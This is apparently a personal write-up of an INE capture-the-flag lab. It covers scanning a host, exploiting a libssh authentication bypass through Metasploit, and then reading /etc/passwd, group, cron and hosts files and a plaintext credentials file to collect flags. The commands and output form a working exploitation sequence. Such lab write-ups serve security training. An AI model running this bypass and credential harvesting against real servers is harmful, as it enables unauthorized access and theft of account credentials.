*domain* : target1.ine.local
*ip*: 192.96.27.4

---

# Enumeration
## port scan
```bash
nmap --min-rate 10000 -p- -sV target1.ine.local

PORT   STATE SERVICE VERSION
22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
```
## service scan
```bash
sudo nmap -sV -A -T4 target1.ine.local

PORT   STATE SERVICE VERSION
22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
| ssh-hostkey: 
|_  2048 31:e2:1d:f1:b2:39:0c:a3:ec:db:01:4a:eb:a2:39:c7 (RSA)
MAC Address: 02:42:C0:60:1B:04 (Unknown)
```

## seraching for exploit
``` bash
searchsploit libssh                    

libSSH - Authentication Bypass                        | linux/remote/45638.py
LibSSH 0.7.6 / 0.8.4 - Unauthorized Access            | linux/remote/46307.py
```

# Exploitation
## exploiting ssh
```bash 
# msfconsole

1   search libssh
	- auxiliary/scanner/ssh/libssh_auth_bypass
2   use 0
3   show options
4   setg rhosts target1.ine.local
5   set spawn_pty true
6   run
7   sessions
8   sessions -u 1 # did not work as session is incompitable
```
# post-exploitation
### local enumeration
msfconsole
sessions -i 1
`user enum`
```shell
# sessions
sh-5.2$ cat /etc/passwd
cat /etc/passwd
root:x:0:0::/root:/usr/bin/bash
alpm:x:980:980:Arch Linux Package Management:/:/usr/bin/nologin
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/usr/bin/nologin
dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
systemd-coredump:x:979:979:systemd Core Dumper:/:/usr/bin/nologin
systemd-network:x:978:978:systemd Network Management:/:/usr/bin/nologin
systemd-oom:x:977:977:systemd Userspace OOM Killer:/:/usr/bin/nologin
systemd-journal-remote:x:976:976:systemd Journal Remote:/:/usr/bin/nologin
systemd-resolve:x:975:975:systemd Resolver:/:/usr/bin/nologin
systemd-timesync:x:974:974:systemd Time Synchronization:/:/usr/bin/nologin
tss:x:973:973:tss user for tpm2:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
user:x:1000:1000::/home/user:/usr/bin/bash
FLAG1_e0b90edf7b204e4f9eb1a1df5c3131c9:x:1001:984::/home/FLAG1_e0b90edf7b204e4f9eb1a1df5c3131c9:/usr/bin/bash
```

`groups enumeration`
``` shell
# groups enumeration
- cat /etc/group
  FLAG2_e1db55d21c484b6987fa52897e1c690d

# users
ls -la /home/
total 20
drwxr-xr-x 1 root root 4096 Nov 14 08:31 .
drwxr-xr-x 1 root root 4096 May 14 09:38 ..
drwxr-xr-x 1 root root 4096 Nov 14 08:28 temp
drwx------ 1 user user 4096 May 14 09:38 user
sh-5.2$ ls /home/user
ls /home/user
credentials.txt
sh-5.2$ cat /home/user/credentials.txt
cat /home/user/credentials.txt
john:Pass@john123
# got credentials.txt -> john:Pass@john123
```
`cronjobs`
```shell
- cat /etc/cron*/*
cat /etc/cron*/*
# Run the hourly jobs
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
01 * * * * root run-parts /etc/cron.hourly
0 * * * * root /root/tmp/"FLAG3_c28c5c17e6ad41cb8077f3d6577ede80"
#!/bin/sh
# Check whether 0anacron was run today already
if test -r /var/spool/anacron/cron.daily; then
    day=`cat /var/spool/anacron/cron.daily`
fi
.... 
```
`dns enum`
```bash
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
192.96.27.4     target1.ine.local target1
#FLAG4_8b50f8b52d844b72b9c5af6fc6b46d92
192.96.27.2 INE
192.96.27.3 target2.ine.local
192.96.27.4 target1.ine.local
[user@target1 /]$ 
```

